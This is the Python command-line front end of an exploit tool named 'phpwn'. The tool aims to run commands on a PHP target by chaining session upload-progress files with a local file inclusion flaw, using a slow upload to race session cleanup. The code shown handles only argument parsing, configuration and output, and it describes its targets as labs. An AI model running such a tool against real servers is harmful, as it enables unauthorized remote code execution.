from __future__ import annotations

import argparse
import sys

from . import __version__
from .exec import ExecConfig, new_sid, run
from .httpio import Target, TargetError


def _parse_headers(values: list[str]) -> dict[str, str]:
    headers: dict[str, str] = {}
    for raw in values:
        if ":" not in raw:
            raise SystemExit(f"invalid --header (expected 'Name: value'): {raw}")
        key, value = raw.split(":", 1)
        headers[key.strip()] = value.strip()
    return headers


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="phpwn",
        description="execute a command on a PHP lab target through session upload progress + LFI",
    )
    parser.add_argument("--version", action="version", version=f"phpwn {__version__}")
    parser.add_argument("--url", required=True, help="https URL of the upload endpoint")
    parser.add_argument(
        "--lfi",
        required=True,
        help="LFI URL; the session path is appended, or use {file} as a placeholder",
    )
    parser.add_argument("--cmd", default="id", help="command to execute (default: id)")
    parser.add_argument("--sessions", default=None, help="session.save_path on the target")
    parser.add_argument("--cookie", default="")
    parser.add_argument("--header", action="append", default=[], metavar="NAME: VALUE")
    parser.add_argument("--insecure", action="store_true", help="skip TLS verification")
    parser.add_argument("--ca", default=None, help="CA bundle for a private lab certificate")
    parser.add_argument("--allow-http", action="store_true", help="allow plaintext http (local lab)")
    parser.add_argument("--timeout", type=float, default=15.0)
    parser.add_argument("--path", default=None, help="override the upload request path")
    parser.add_argument("--slow-mb", type=int, default=2, help="slow-upload size for the cleanup race")
    parser.add_argument("--verbose", action="store_true")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    try:
        target = Target(
            args.url,
            insecure=args.insecure,
            allow_http=args.allow_http,
            timeout=args.timeout,
            ca_file=args.ca,
        )
    except TargetError as exc:
        print(f"target error: {exc}", file=sys.stderr)
        return 2

    cfg = ExecConfig(
        target=target,
        lfi=args.lfi,
        cmd=args.cmd,
        upload_path=args.path or target.request_path,
        sid=new_sid(),
        cookie=args.cookie,
        headers=_parse_headers(args.header),
        sessions_dir=args.sessions,
        slow_mb=args.slow_mb,
        verbose=args.verbose,
    )

    if args.verbose:
        print(f"[.] session id: {cfg.sid}")
        print(f"[.] command: {cfg.cmd}")
        print(f"[.] session paths: {', '.join(cfg.session_paths())}")

    ok, output = run(cfg)
    if not ok:
        print("[-] no command output observed", file=sys.stderr)
        print(
            "    likely causes: session.upload_progress.cleanup=On, a custom session "
            "save handler/path, or no working LFI",
            file=sys.stderr,
        )
        return 1

    sys.stdout.write(output if output.endswith("\n") else output + "\n")
    return 0
